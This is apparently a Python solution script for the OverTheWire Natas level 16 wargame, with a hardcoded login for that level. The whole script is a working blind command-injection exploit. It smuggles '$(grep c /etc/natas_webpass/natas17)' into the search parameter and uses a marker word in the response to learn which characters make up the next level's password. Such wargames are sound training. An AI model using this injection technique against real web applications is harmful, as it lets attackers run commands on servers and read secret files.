import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

u="http://natas16.natas.labs.overthewire.org/"

VALID_CHARS = string.digits + string.ascii_letters

matchingChars = ""

for c in VALID_CHARS:
    payload = "$(grep " + c + " /etc/natas_webpass/natas17)zigzag"
    url = u + "?needle=" + payload + "&submit=Search"

    response = requests.get(url, auth=basicAuth, verify=False)

    if 'zigzag' not in response.text:
        print("Found a valid char : %s" % c)
        matchingChars += c

print("Matching chars: ", matchingChars) 